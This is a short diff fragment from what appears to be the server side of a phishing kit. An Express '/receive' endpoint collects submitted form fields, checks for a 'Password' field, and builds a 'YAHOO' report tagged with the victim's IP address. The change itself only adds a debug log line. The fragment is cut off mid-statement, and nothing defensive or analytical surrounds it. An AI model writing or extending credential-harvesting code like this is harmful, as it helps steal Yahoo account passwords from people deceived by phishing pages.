@@ -71,6 +71,7 @@ app.post('/receive', async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
   const myObjects = Object.keys(myObject);
+	console.log(myObjects);
 
   if (myObjects.includes('Password')) {
     message += `✅ UPDATE TEAM | YAHOO | USER_${ipAddress}\n\n` +
